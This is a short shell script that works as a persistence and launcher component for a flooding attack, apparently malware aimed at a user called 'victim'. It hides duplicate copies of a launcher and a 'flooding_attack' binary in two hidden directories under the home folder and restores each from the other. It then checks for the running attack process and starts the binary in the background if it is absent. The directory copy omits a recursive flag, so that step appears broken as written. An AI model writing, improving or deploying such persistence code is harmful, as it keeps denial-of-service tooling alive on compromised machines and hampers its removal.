#!/bin/sh

home_dir="/home/victim"
launch_dir=".launch_attack"
dir01=".etc/.module"
dir02=".var/.module"
launch_file="launching_attack.sh"
flooding_file="flooding_attack"

check_and_restore() {
  if [ ! -d "$home_dir/$dir01" ] || [ ! -f "$home_dir/$dir01/$launch_file" ] || [ ! -f "$home_dir/$dir01/$flooding_file" ]
  then
    cp "$home_dir/$dir02" "$home_dir/$dir01"
  fi
  if [ ! -d "$home_dir/$dir02" ] || [ ! -f "$home_dir/$dir02/$launch_file" ] || [ ! -f "$home_dir/$dir02/$flooding_file" ]
  then
    cp "$home_dir/$dir01" "$home_dir/$dir02"
  fi
}

is_process_exist() {
  local process_name="flooding_attack"
  ps -e | grep -q "$process_name"
}

payload() {
  is_process_exist
  if [ $? -eq 0 ]; then # positive match
    echo "Attack already launched!"
  else
    $home_dir/$dir01/flooding_attack&
  fi
}

main() {
  check_and_restore
  payload
}
main
